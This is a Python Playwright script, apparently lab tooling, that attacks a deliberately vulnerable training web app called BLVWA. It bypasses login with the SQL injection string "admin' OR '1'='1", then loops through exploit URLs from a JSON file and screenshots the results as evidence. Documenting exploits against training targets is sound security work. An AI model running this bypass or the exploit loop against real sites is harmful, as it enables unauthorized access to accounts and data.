#!/usr/bin/env python3
"""
BLVWA Hardened Offensive Screenshot Engine
==========================================
Ensures valid session, triggers exploits, and captures impact.
"""

import asyncio
import json
import os
import sys
from datetime import datetime
from pathlib import Path

from playwright.async_api import async_playwright
from rich.console import Console

# Target config (redundant here to be safe)
TARGET_URL = "https://burger-lab-vulnerable-web-application-tnvx.onrender.com"
PAGE_TIMEOUT = 15000

console = Console()

async def capture_vuln_evidence(vulns_file: str = "scanner/vulns.json"):
    evidence_dir = Path("/home/hgema/Desktop/Burger/scanner/evidence/screenshots")
    evidence_dir.mkdir(parents=True, exist_ok=True)

    with open(vulns_file) as f:
        vulns = json.load(f)

    console.rule("[bold red]BLVWA Offensive Exploit Capture[/bold red]")
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        # Use a consistent storage state for session persistence
        context = await browser.new_context(
            viewport={"width": 1280, "height": 900},
            ignore_https_errors=True
        )
        page = await context.new_page()

        # ─── 1. HARDENED LOGIN ───
        console.print("[yellow]Attempting SQLi Auth Bypass...[/yellow]")
        await page.goto(f"{TARGET_URL}/login")
        await page.fill('input[name="username"]', "admin' OR '1'='1")
        await page.fill('input[name="password"]', "anything")
        await page.click('button[type="submit"]')
        
        # Wait for redirect to home
        try:
            await page.wait_for_url(f"{TARGET_URL}/", timeout=10000)
            console.print("[bold green]✓ Login Successful: Session active.[/bold green]\n")
        except:
            console.print("[bold red]❌ Login Failed! Redirect to home not detected.[/bold red]")
            # Check if we are still on login
            if "/login" in page.url:
                console.print("[red]Stuck on login page. Exploit might be blocked or DB empty.[/red]")
                await browser.close()
                return

        # ─── 2. EXPLOIT LOOP ───
        captured = 0
        for vuln in vulns:
            if not vuln.get("screenshot"): continue
            
            vid = vuln["id"]
            name = vuln["name"]
            url = f"{TARGET_URL}{vuln['url']}"
            
            console.print(f"[cyan]Exploiting {vid}: {name}[/cyan]")
            
            try:
                # Navigate to the target
                await page.goto(url, timeout=PAGE_TIMEOUT)
                await page.wait_for_load_state("networkidle")

                # If redirected to login, skip with error
                if "/login" in page.url and not "login" in vuln["url"].lower():
                    console.print(f"  [red]⚠ Redirected to login. Session lost for {vid}[/red]")
                    continue

                # ─── TRIGGER IMPACT ───
                # Highlight reflection/payload
                payload = vuln.get("payload", "")
                if payload:
                    await page.evaluate(f"""
                        (payload) => {{
                            const search = (node) => {{
                                if (node.nodeType === 3 && node.textContent.includes(payload)) {{
                                    const span = document.createElement('span');
                                    span.style.border = '5px solid #ff0000';
                                    span.style.boxShadow = '0 0 20px #ff0000';
                                    span.style.padding = '2px';
                                    node.parentNode.replaceChild(span, node);
                                    span.appendChild(node);
                                }} else {{
                                    for (let child of node.childNodes) search(child);
                                }}
                            }};
                            search(document.body);
                        }}
                    """, payload)

                # Capture
                clean_name = "".join([c if c.isalnum() else "_" for c in name])
                filename = f"{vid}_{clean_name}.png"
                path = evidence_dir / filename
                
                await page.screenshot(path=str(path), full_page=True)
                console.print(f"  [green]✅ Evidence Captured: {filename}[/green]")
                captured += 1

            except Exception as e:
                console.print(f"  [red]❌ Exploit Failed: {str(e)[:60]}[/red]")

        await browser.close()
        console.print(f"\n[bold green]🏁 COMPLETED: {captured} exploits documented.[/bold green]")

if __name__ == "__main__":
    asyncio.run(capture_vuln_evidence())
